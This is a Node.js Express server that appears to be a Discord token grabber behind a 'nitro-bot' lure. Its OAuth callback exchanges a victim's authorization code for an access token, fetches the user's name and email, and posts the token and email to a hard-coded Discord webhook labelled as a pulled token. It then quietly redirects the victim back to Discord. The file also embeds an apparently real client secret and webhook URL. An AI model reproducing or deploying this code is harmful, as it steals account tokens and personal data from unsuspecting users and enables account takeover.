const express = require('express');
const app = express();

const CLIENT_ID = "1560958983966302298"; 
const CLIENT_SECRET = "MivsTC7IRJ4lNYNf3uYPUysbI2KKvHFp"; 
const REDIRECT_URI = "https://nitro-bot.onrender.com/callback"; 
const WEBHOOK = "https://discord.com/api/webhooks/1560966202203836428/4B5ZJ9mJpM8Ht0Jnok4WPXGO-IP-wjsvF3mHiSGIScrjZyxqLut7D00lLUCjYxICvIu9";

app.get('/', (req, res) => {
  res.send('Server is running!');
});

app.get('/callback', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('No code.');

  try {
    const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: "authorization_code",
        code: code,
        redirect_uri: REDIRECT_URI,
      }),
    });
    const tokenData = await tokenRes.json();

    const userRes = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const userData = await userRes.json();

    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "**🎯 تم سحب توكن!**",
        embeds: [{
          title: "Account",
          color: 0x5865f2,
          fields: [
            { name: "User", value: userData.username, inline: true },
            { name: "Email", value: userData.email || "None", inline: true },
            { name: "Token", value: "```" + tokenData.access_token + "```" }
          ]
        }]
      })
    });

    res.redirect('https://discord.com/channels/@me');
  } catch (err) {
    res.send('Error: ' + err.message);
  }
});

app.listen(process.env.PORT || 3000);
